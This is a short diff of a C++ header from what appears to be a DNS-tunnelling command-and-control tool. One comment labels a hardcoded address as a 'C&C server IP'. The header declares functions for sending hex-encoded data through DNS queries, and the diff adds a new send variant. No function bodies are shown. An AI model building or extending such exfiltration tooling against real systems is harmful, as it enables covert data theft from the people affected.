@@ -23,4 +23,5 @@ inline const char* DNS_SERVER_IP = "100.111.111.100";  // Local C&C server IP
 // ==========================================
 int startConnection(const char* domain);
 int sendData(int& id, int& packetNumber, const char* domain, const char* data);
+int sendDataTypeC(int& id, int& packetNumber, const char* domain, const char* data);
 std::string convertToHex(const char* string);
